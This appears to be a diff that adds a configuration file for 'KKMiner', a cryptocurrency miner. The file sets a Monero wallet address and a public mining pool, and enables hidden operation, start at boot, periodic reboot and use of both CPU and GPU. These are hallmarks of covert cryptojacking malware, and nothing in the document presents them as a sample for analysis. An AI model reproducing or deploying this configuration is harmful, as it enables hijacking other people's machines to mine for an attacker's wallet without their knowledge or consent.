@@ -1,0 +1,13 @@
+[Config]
+Name=KKMiner
+currency=cryptonight
+wallet=4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGijS7GqhcZDkMfcRZ
+pool=pool.supportxmr.com:5555
+standby_pool=
+Initialization=0
+isBoot=1
+isReboot=1
+isHide=1
+isCPU=1
+isGPU=1
+RebootTime=48
